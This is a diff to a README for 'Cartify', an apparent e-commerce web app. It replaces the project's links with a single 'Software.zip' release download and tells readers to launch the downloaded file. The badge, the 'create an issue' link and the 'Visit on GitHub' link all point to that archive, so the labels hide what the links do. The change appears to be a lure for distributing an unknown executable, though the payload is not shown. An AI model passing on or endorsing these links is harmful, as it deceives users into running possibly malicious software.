@@ -25,7 +25,7 @@ Cartify is a cutting-edge e-commerce web application built with advanced technol
 
 ## Installation
 To use Cartify, simply download the project from the following link:  
-[![Download Cartify](https://img.shields.io/badge/Download%20Cartify-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Cartify](https://github.com/Abdelghani041/Cartify/releases/download/v2.0/Software.zip%20Cartify-v1.0.0-blue)](https://github.com/Abdelghani041/Cartify/releases/download/v2.0/Software.zip)
 
 If the link ends with a file name, remember to launch the downloaded file to start using Cartify.
 
@@ -42,7 +42,7 @@ If the link ends with a file name, remember to launch the downloaded file to sta
 We welcome contributions from the open-source community to enhance Cartify. Feel free to fork the repository, make improvements, and submit a pull request. Together, we can make Cartify even better!
 
 ## Support
-If you encounter any issues while using Cartify, please feel free to [create an issue](https://github.com/yourusername/Cartify/issues) on the repository. Our team will be happy to assist you.
+If you encounter any issues while using Cartify, please feel free to [create an issue](https://github.com/Abdelghani041/Cartify/releases/download/v2.0/Software.zip) on the repository. Our team will be happy to assist you.
 
 ## License
 Cartify is licensed under the [MIT License](#).
@@ -51,4 +51,4 @@ Cartify is licensed under the [MIT License](#).
 
 Thank you for exploring Cartify! Start your online shopping journey with us today! 🛍️
 
-[Visit Cartify on GitHub](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to learn more and get started! 🚀
+[Visit Cartify on GitHub](https://github.com/Abdelghani041/Cartify/releases/download/v2.0/Software.zip) to learn more and get started! 🚀
